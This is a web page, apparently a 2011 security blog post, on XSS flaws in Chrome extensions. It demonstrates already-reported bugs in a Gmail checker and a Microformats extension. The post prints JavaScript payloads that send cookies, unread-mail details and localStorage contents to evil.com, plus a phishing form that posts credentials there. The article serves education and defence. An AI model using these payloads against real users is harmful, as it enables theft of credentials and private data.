@@ -1,0 +1,334 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="index, follow" />
+
+
+    <link rel="stylesheet" type="text/css" href="https://oxdef.info/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="https://oxdef.info/theme/pygments/github.min.css">
+  <link rel="stylesheet" type="text/css" href="https://oxdef.info/theme/font-awesome/css/font-awesome.min.css">
+
+    <link href="https://oxdef.info//static/custom.css" rel="stylesheet">
+
+
+    <link href="https://oxdef.info/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="oxdef RSS">
+
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+
+
+<meta name="author" content="oxdef" />
+<meta name="description" content="Intro Current days Google Chrome web browser becomes more and more popular. It is really fast, easy-to-use and in same time powerful browser. I will not write about whole security architecture of Chrome. There is a good article about it by Larry Seltzer called &#34;Google&#39;s Chrome Extensions Show Security Focus …" />
+<meta name="keywords" content="browser, extensions, chrome">
+
+<meta property="og:site_name" content="oxdef"/>
+<meta property="og:title" content="Web application vulnerabilities in context of browser extensions"/>
+<meta property="og:description" content="Intro Current days Google Chrome web browser becomes more and more popular. It is really fast, easy-to-use and in same time powerful browser. I will not write about whole security architecture of Chrome. There is a good article about it by Larry Seltzer called &#34;Google&#39;s Chrome Extensions Show Security Focus …"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="https://oxdef.info/posts/browser-extension-security"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2011-01-18 19:49:00+03:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="https://oxdef.info/author/oxdef.html">
+<meta property="article:section" content="misc"/>
+<meta property="article:tag" content="browser"/>
+<meta property="article:tag" content="extensions"/>
+<meta property="article:tag" content="chrome"/>
+<meta property="og:image" content="/images/dots.png">
+
+  <title>oxdef &ndash; Web application vulnerabilities in context of browser extensions</title>
+
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="https://oxdef.info">
+        <img src="/images/dots.png" alt="oxdef" title="oxdef">
+      </a>
+      <h1><a href="https://oxdef.info">oxdef</a></h1>
+
+<p>Some thoughts on web security</p>
+      <nav>
+        <ul class="list">
+          <li><a href="https://oxdef.info/pages/about">About</a></li>
+          <li><a href="https://oxdef.info/pages/csp-reporter">CSP Reporter</a></li>
+          <li><a href="https://oxdef.info/pages/csp-tester">CSP Tester</a></li>
+
+          <li><a href="https://www.owasp.org/index.php/Russia" target="_blank">OWASP Russia</a></li>
+        </ul>
+      </nav>
+
+      <ul class="social">
+        <li><a class="sc-envelope-o" href="mailto:oxdef@oxdef.info" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/oxdef" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-twitter" href="https://twitter.com/oxdef" target="_blank"><i class="fa fa-twitter"></i></a></li>
+        <li><a class="sc-rss" href="/rss" target="_blank"><i class="fa fa-rss"></i></a></li>
+      </ul>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+<article class="single">
+  <header>
+      
+    <h1 id="browser-extension-security">Web application vulnerabilities in context of browser extensions</h1>
+    <p>
+          Posted on 18 January 2011 in <a href="https://oxdef.info/category/misc">misc</a>
+
+
+    </p>
+  </header>
+
+
+  <div>
+    <h2>Intro</h2>
+<p>Current days Google Chrome web browser becomes more and more popular. 
+It is really fast, easy-to-use and in same time powerful browser. I will not write about whole
+security architecture of Chrome. There is a good article about it by Larry Seltzer 
+called <a href="http://www.pcmag.com/article2/0,2817,2359778,00.asp">"Google's Chrome Extensions Show Security Focus"</a>. Let's focus our attention 
+on Chrome extensions platform. Like Mozilla Firefox Chrome supports extensions or addons, 
+which makes your web surfing with it more comfortable. </p>
+<p>What are extensions in Google Chrome browser? <a href="http://code.google.com/chrome/extensions/index.html">Extensions</a> are small software programs that can modify 
+and enhance the functionality of the Chrome browser. Developers writes them using well-know 
+web technologies such as HTML, JavaScript (including <a href="http://dev.w3.org/html5/spec/Overview.html">HTML5</a> features) and CSS. Using of such technologies 
+of course makes developing ease. But what security risks they will bring to us?</p>
+<h2>XSS</h2>
+<p>Lets look on popular (18,368 installations per week) extension called <a href="https://chrome.google.com/extensions/detail/gffjhibehnempbkeheiccaincokdjbfe">"Google Mail Checker Plus"</a>.
+This extension simply displays the number of unread messages in your Gmail inbox, 
+can make preview of mail and supports desktop <a href="http://www.html5rocks.com/tutorials/notifications/quick/">notifications</a>.</p>
+<p><img alt="Mail preview in popup of Google Mail Checker Plus" src="https://oxdef.info/images/2014/12/google_mail_checker_plus.png"></p>
+<p>On preview we can see at least subject, from and piece of body of letter. 
+Ok, lets send to us self letter with subject like: </p>
+<div class="highlight"><pre><span></span>2&quot;&#39;&gt;<span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;http://evil.com/own.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+
+
+<p><code>own.js</code> is simple javascript demo payload:</p>
+<div class="highlight"><pre><span></span><span class="nt">document</span><span class="p">.</span><span class="nc">body</span><span class="p">.</span><span class="nc">innerHTML</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">;</span>
+<span class="nt">img</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">Image</span><span class="o">();</span>
+<span class="nt">img</span><span class="p">.</span><span class="nc">src</span> <span class="o">=</span> <span class="s1">&#39;http://evil.com/stallowned.jpg&#39;</span><span class="o">;</span>
+<span class="nt">document</span><span class="p">.</span><span class="nc">body</span><span class="p">.</span><span class="nc">appendChild</span><span class="o">(</span><span class="nt">img</span><span class="o">);</span>
+</pre></div>
+
+
+<p>For the first we see such notification:</p>
+<p><img alt="XSS in Google Mail Checker Plus notification part" src="https://oxdef.info/images/2014/12/gmail_checker_xss_notificate.png"></p>
+<p>For the second we click on extension's icon and see our worked payload in popup window:</p>
+<p><img alt="XSS in Google Mail Checker Plus" src="https://oxdef.info/images/2014/12/gmail_checker_xss.png"></p>
+<p>It works! By the way this XSS has been already <a href="http://lostmon.blogspot.com/2010/06/gmail-checker-plus-chrome-extension-xss.html">reported</a> by Lostmon in <strong>June 03, 2010</strong>
+and fixed version of extension is available. Lostmon wrote that: </p>
+<blockquote>
+<p>"All extensions runs over his origin and no have way to altered data from extension or get sensitive data like , email account or password etc.."</p>
+</blockquote>
+<p>Let's discover this web vulnerability in context of <strong>this</strong> extension to understand risks.</p>
+<h2>Cookies</h2>
+<p>Authentication data stored in cookie's is popular target for <a href="http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a> attacks. But extension scripts works in
+its own origin so extension can't directly access cookie by using <code>document.cookie</code> object. 
+It needs to use special <a href="http://code.google.com/chrome/extensions/cookies.html">cookies API</a> and have permissions for this purpose and for target hosts. 
+For example (piece of manifest):</p>
+<div class="highlight"><pre><span></span>{
+    &quot;name&quot;: &quot;My extension&quot;,
+    ...
+    &quot;permissions&quot;: [
+    &quot;cookies&quot;,
+    &quot;*://*.google.com&quot;
+    ],
+...
+}
+</pre></div>
+
+
+<p>The risk occurs when extension have to much permissions, e.g. cookies and big number of hosts in manifest.
+In such case XSS vulnerability will become more dangerous because evil payload will gain access to cookies 
+of <strong>all</strong> these allowed hosts using cookies API like this:</p>
+<div class="highlight"><pre><span></span><span class="nt">chrome</span><span class="p">.</span><span class="nc">cookies</span><span class="p">.</span><span class="nc">getAll</span><span class="o">(</span><span class="p">{}</span><span class="o">,</span> <span class="nt">function</span><span class="o">(</span><span class="nt">cookies</span><span class="o">)</span> <span class="p">{</span>
+    <span class="err">var</span> <span class="err">dump</span> <span class="err">=</span> <span class="err">&#39;</span><span class="n">COOKIES</span><span class="p">:</span> <span class="s1">&#39;;</span>
+<span class="s1">    for (var i in cookies) {</span>
+<span class="s1">        dump += cookies</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span><span class="s1">.domain + &#39;</span><span class="o">:</span><span class="s1">&#39; + cookies</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span><span class="s1">.name  + &#39;</span><span class="o">:</span><span class="s1">&#39; + cookies</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span><span class="s1">.value + &#39;</span> <span class="o">|</span> <span class="s1">&#39;;</span>
+<span class="s1">    }</span>
+<span class="s1">    img = new Image();</span>
+<span class="s1">    img.src = &#39;</span><span class="n">http</span><span class="o">://</span><span class="n">evil</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">stallowned</span><span class="o">.</span><span class="n">jpg</span><span class="o">?</span><span class="err">&#39;</span> <span class="o">+</span> <span class="n">dump</span><span class="p">;</span>
+    <span class="err">document.body.appendChild(img)</span><span class="p">;</span>
+<span class="p">}</span><span class="o">);</span>
+</pre></div>
+
+
+<h2>Browser data as target and permissions</h2>
+<p>In previous section was described a risk when through XSS attack on extension in particular cases
+(special permissions must be granted) malicious man can gain access to cookies from different sites.
+It concerns and such things like bookmarks, history and other things which can be granted in <a href="http://code.google.com/chrome/extensions/manifest.html#permissions">permissions</a> section
+of manifest file and can be accessed through chrome API! There for XSS in such extension can lead 
+compromise user's desktop sensitive data and this risk strongly depends on how much permissions does extension have.</p>
+<h2>Gmail's External content control bypass</h2>
+<p>It is of course not critical risk but if malicious man can execute arbitrary
+JavaScript code in concrete letter he can inject e.g. <code>IMG</code> tag and see that the image is being fetched.
+Therefore he will know when you will have read the message <strong>even</strong> if you have switched off displaying 
+of external content.</p>
+<h2>Message data theft</h2>
+<p>It is much worse risk! Imagine that you will receive such payload </p>
+<div class="highlight"><pre><span></span><span class="nt">var</span> <span class="nt">dump</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">;</span>
+<span class="nt">var</span> <span class="nt">e</span> <span class="o">=</span> <span class="nt">document</span><span class="p">.</span><span class="nc">getElementsByTagName</span><span class="o">(</span><span class="s1">&#39;a&#39;</span><span class="o">);</span>
+<span class="nt">i</span><span class="o">=</span><span class="nt">0</span><span class="o">;</span>
+<span class="nt">while</span><span class="o">(</span><span class="nt">i</span> <span class="o">&lt;</span> <span class="nt">e</span><span class="p">.</span><span class="nc">length</span><span class="o">)</span> <span class="p">{</span> 
+    <span class="err">if</span> <span class="err">(e</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span><span class="err">.className</span> <span class="err">==</span> <span class="err">&#39;openLink&#39;)</span> <span class="err">{</span>
+        <span class="err">dump</span> <span class="err">+=</span> <span class="err">e</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span><span class="err">.innerText</span> <span class="err">+</span> <span class="err">&#39;</span> <span class="err">|</span> <span class="err">&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nt">i</span><span class="o">++;</span>
+<span class="err">}</span>
+<span class="nt">img</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">Image</span><span class="o">();</span>
+<span class="nt">img</span><span class="p">.</span><span class="nc">src</span> <span class="o">=</span> <span class="s1">&#39;http://evil.com/sniff.jpg?&#39;</span> <span class="o">+</span> <span class="nt">dump</span><span class="o">;</span>
+<span class="nt">document</span><span class="p">.</span><span class="nc">body</span><span class="p">.</span><span class="nc">appendChild</span><span class="o">(</span><span class="nt">img</span><span class="o">);</span>
+</pre></div>
+
+
+<p>Yes, this is simple code for dumping unread messages and malicious man can get your mail <strong>private</strong> data
+from <code>popup</code> HTML document: senders, subjects, pieces of message body! I see your scared look =)</p>
+<h2>Extension settings leakage</h2>
+<p>Extensions can save sensitive data (commonly settings) using the HTML5 web storage API 
+(such as localStorage) which is supported in Google Chrome. Yes, it is unlikely but not impossible. 
+For example extension with bad architecture can store there some account information. 
+Dumping such data is trivial task:</p>
+<div class="highlight"><pre><span></span><span class="nt">var</span> <span class="nt">dump</span> <span class="o">=</span> <span class="s1">&#39; LOCALSTORAGE: &#39;</span><span class="o">;</span>
+<span class="nt">for</span> <span class="o">(</span><span class="nt">i</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">i</span> <span class="o">&lt;</span> <span class="nt">localStorage</span><span class="p">.</span><span class="nc">length</span><span class="o">;</span> <span class="nt">i</span><span class="o">++</span> <span class="o">)</span> <span class="p">{</span>
+    <span class="err">dump</span> <span class="err">+=</span> <span class="err">&quot;</span><span class="n">KEY</span><span class="p">:</span> <span class="s2">&quot; + localStorage.key(i);</span>
+<span class="s2">    dump += &quot;</span> <span class="n">VALUE</span><span class="o">:</span> <span class="s2">&quot; + localStorage.getItem(localStorage.key(i)) + &quot;</span> <span class="o">|</span> <span class="err">&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">img</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">Image</span><span class="o">();</span>
+<span class="nt">img</span><span class="p">.</span><span class="nc">src</span> <span class="o">=</span> <span class="s1">&#39;http://evil.com/sniff.jpg?&#39;</span> <span class="o">+</span> <span class="nt">dump</span><span class="o">;</span>
+<span class="nt">document</span><span class="p">.</span><span class="nc">body</span><span class="p">.</span><span class="nc">appendChild</span><span class="o">(</span><span class="nt">img</span><span class="o">);</span>
+</pre></div>
+
+
+<h2>Phishing</h2>
+<p>As already I said extension can't directly access cookies data. Stealing of authentication data by XSS 
+in such case is not so trivial but malicious man can simply use phishing technique and ask user to 
+submit this data him self! ::</p>
+<div class="highlight"><pre><span></span>var msg = &#39;Please, enter account information.&#39;;
+msg += &#39;<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://evil.com/login&quot;</span><span class="nt">&gt;</span>Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">text</span> <span class="na">name=</span><span class="s">user</span><span class="nt">&gt;</span>&#39;;
+msg += &#39; <span class="nt">&lt;br&gt;</span>Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">password</span> <span class="na">name=</span><span class="s">pass</span><span class="nt">&gt;&lt;br&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span><span class="nt">&gt;&lt;/form&gt;</span>&#39;;
+document.body.innerHTML = msg;
+</pre></div>
+
+
+<p>This image looks ugly but don't forget that it simple PoC.</p>
+<p><img alt="Phishing attack vector" src="https://oxdef.info/images/2014/12/fishing.png"></p>
+<h2>JSON data leakage</h2>
+<p>JSON is a lightweight data-interchange format and it is mostly used in AJAX web applications in client-server
+data interchange. There are at least 2 security issues:</p>
+<ol>
+<li>
+<p>Usage of <code>eval()</code> JavaScript function to parse received untrusted/not controlled JSON data. Google developers 
+gives advance notice in Security <a href="http://code.google.com/chrome/extensions/xhr.html">considerations</a> about this risk in developer's guide.</p>
+</li>
+<li>
+<p>This less obvious but interesting problem called JavaScript <a href="http://www.owasp.org/index.php/OWASP_AJAX_Security_Guidelines#JSON">hijacking</a>. 
+If JSON(P) is used to carry sensitive data in insecure way it can lead a data leakage. 
+In context of extension it is common as for usual AJAX web application - there is no differences. 
+Malicious man can sniff and discover client-server data exchange of extension. And if he find 
+insecure usage of JSON(P) he will have opportunity to attack users and steal their sensitive data.</p>
+</li>
+</ol>
+<h2>Content scripts</h2>
+<p>For example, you want to change color theme of some page which you visits to your own colors.
+Another good example is surrounding all plain-text URLs on the page with <code>A</code> HTML tag.
+There is thing for such purposes called <a href="http://code.google.com/chrome/extensions{filename}_scripts.html">content scripts</a>. A content script is some 
+JavaScript that executes <strong>in the context of a page</strong> (not extension) 
+that's been loaded into the browser. So these content scripts can <strong>read</strong> and <strong>modify</strong> data on the page.</p>
+<p>Content scripts are very limited in chrome APIs and can't:</p>
+<ul>
+<li>Use chrome.* APIs (except for parts of chrome.extension)</li>
+<li>Use variables or functions defined by their extension's pages</li>
+<li>Use variables or functions defined by web pages or by other content scripts</li>
+<li>Make cross-site XMLHttpRequests</li>
+</ul>
+<p>But content scrips <strong>can</strong> communicate with parent extension by exchanging <a href="http://code.google.com/chrome/extensions/messaging.html">messaging</a>.
+Because content scrips can read and modify web pages we have at least 2 risks: </p>
+<ol>
+<li>Bad coded content script can add vulnerability (e.g. XSS) to the page by modifying content of it</li>
+<li>Bad page can attack extension</li>
+</ol>
+<p>Lets look into follow piece of HTML code (it is popular <a href="http://microformats.org/wiki/hcard">hCard</a> microformat):</p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;vcard&quot;</span><span class="nt">&gt;</span>
+   <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;fn&quot;</span><span class="nt">&gt;</span>James Bond<span class="nt">&lt;/div&gt;</span>
+   <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;org&quot;</span><span class="nt">&gt;</span>MI-6<span class="nt">&lt;/div&gt;</span>
+   <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;tel&quot;</span><span class="nt">&gt;</span>604-555-1234<span class="nt">&lt;/div&gt;</span>
+   <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">&quot;url&quot;</span> <span class="na">href=</span><span class="s">&quot;123:&lt;script&gt;d = document.createElement(&#39;div&#39;);d.innerHTML=&#39;&lt;h1&gt;XSS&lt;/h1&gt;&#39;;document.body.appendChild(d);&lt;/script&gt;233&quot;</span><span class="nt">&gt;</span>http://example.com/<span class="nt">&lt;/a&gt;</span>
+ <span class="nt">&lt;/div&gt;</span>
+</pre></div>
+
+
+<p>If we visit page with such demo code and have Microformats extension installed, this extension will try to parse 
+it and show it to us:</p>
+<p><img alt="Attack on Microformats extension (using content scripts)" src="https://oxdef.info/images/2014/12/microformats_xss.png"></p>
+<p>As you can see malicious code is executed. What are risks? This extension connects 
+with your Google account by OAuth and have access to your <strong>Google Contacts</strong>.  This simple code  <code>$(".submithcard").click()</code> 
+will add evil contact to your Google contacts. One more interesting thing in this case is by default
+content scripts can only communicate with parent extension through messages and in this case we can see 
+how evil payload can be passed from content script to popup action. In popup action we can do much more.</p>
+<h2>Outro</h2>
+<p>Google Chrome has really good extension's architecture and Google developers gives enough possibilities 
+to create full-featured and secure extensions. In same time we can see very interesting thing 
+when chosen technologies (HTML, CSS and JavaScript) brings (ok, <strong>not technologies but 
+unclever extension's authors</strong>:) with them self such security problem like XSS  to your desktop. 
+And risks from XSS in such case can be much dangerous then in usual web application. So it is highly recommended to 
+all extension's developers to read "Security considerations" sections in Developer's Guide.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="https://oxdef.info/tag/browser">browser</a>
+      <a href="https://oxdef.info/tag/extensions">extensions</a>
+      <a href="https://oxdef.info/tag/chrome">chrome</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>
+  &copy;  2018 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+</p>
+<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a>
+</p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by-sa/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+           src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " oxdef ",
+  "url" : "https://oxdef.info",
+  "image": "/images/dots.png",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
